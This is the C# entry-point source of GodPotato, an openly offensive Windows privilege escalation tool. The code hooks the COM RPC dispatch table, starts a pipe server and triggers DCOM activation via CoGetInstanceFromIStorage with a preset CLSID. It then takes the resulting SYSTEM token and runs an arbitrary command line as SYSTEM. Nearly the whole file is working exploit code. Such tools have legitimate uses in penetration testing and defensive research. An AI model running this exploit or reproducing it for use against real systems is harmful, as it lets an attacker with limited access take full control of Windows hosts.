using System;
using System.IO;
using GodPotato.NativeAPI;
using static GodPotato.NativeAPI.NativeMethods;
using System.Security.Principal;
using SharpToken;
using static GodPotato.ArgsParse;

namespace GodPotato
{
    internal class Program
    {

        public static IStorage CreateIStorage()
        {
            int hr = 0;
            IStorage ppstgOpen;
            Guid guid = Guid.NewGuid();
            if ((hr = CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes)) == NOERROR)
            {
                if ((hr = StgCreateDocfileOnILockBytes(lockBytes, NativeMethods.STGM_CREATE | NativeMethods.STGM_READWRITE | NativeMethods.STGM_SHARE_EXCLUSIVE, 0, out ppstgOpen)) != NativeMethods.NOERROR)
                {
                    throw new Exception("StgCreateDocfile fail hr = " + hr);
                }
            }
            else
            {
                throw new Exception("CreateILockBytesOnHGlobal fail hr = " + hr);
            }
            return ppstgOpen;
        }



        class GodPotatoArgs
        {
            [ArgsAttribute("clsid", "{4991d34b-80a1-4291-83b6-3328366b9097}", Description = "Clsid")]
            public string clsid { get; set; }
            [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
            public string cmd { get; set; }
        }



        static void Main(string[] args)
        {
            TextWriter ConsoleWriter = Console.Out;

            GodPotatoArgs potatoArgs;

            string helpMessage = PrintHelp(typeof(GodPotatoArgs), @"                                                                                               
    FFFFF                   FFF  FFFFFFF                                                       
   FFFFFFF                  FFF  FFFFFFFF                                                      
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
"
, "GodPotato", new string[0]);


            if (args.Length == 0)
            {
                ConsoleWriter.WriteLine(helpMessage);
                return;
            }
            else
            {
                try
                {
                    potatoArgs = ParseArgs<GodPotatoArgs>(args);
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        e = e.InnerException;
                    }
                    ConsoleWriter.WriteLine("Exception:" + e.Message);
                    ConsoleWriter.WriteLine(helpMessage);
                    return;
                }
            }




            try
            {
                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());

                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);

                ConsoleWriter.WriteLine("[*] HookRPC");
                godPotatoContext.HookRPC();
                ConsoleWriter.WriteLine("[*] Start PipeServer");
                godPotatoContext.Start();

                Guid comGuid = new Guid(potatoArgs.clsid);

                MULTI_QI[] qis = new MULTI_QI[1];
                qis[0].pIID = NativeMethods.GuidToPointer(IUnknownGuid);
                IStorage storage = CreateIStorage();
                GodPotatoStorageTrigger storageTrigger = new GodPotatoStorageTrigger(storage, godPotatoContext);
                try
                {
                    ConsoleWriter.WriteLine("[*] Trigger RPCS CLSID: " + comGuid);

                    int hr = CoGetInstanceFromIStorage(null, ref comGuid, null, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
                    ConsoleWriter.WriteLine("[*] CoGetInstanceFromIStorage: 0x{0:x}" ,hr);
                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine(e);
                }

                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                if (systemIdentity != null)
                {
                    ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
                    TokenuUils.createProcessReadOut(Console.Out, systemIdentity.Token, potatoArgs.cmd);

                }
                else
                {
                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
                }
                godPotatoContext.Restore();
                godPotatoContext.Stop();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);

            }

        }
    }
}
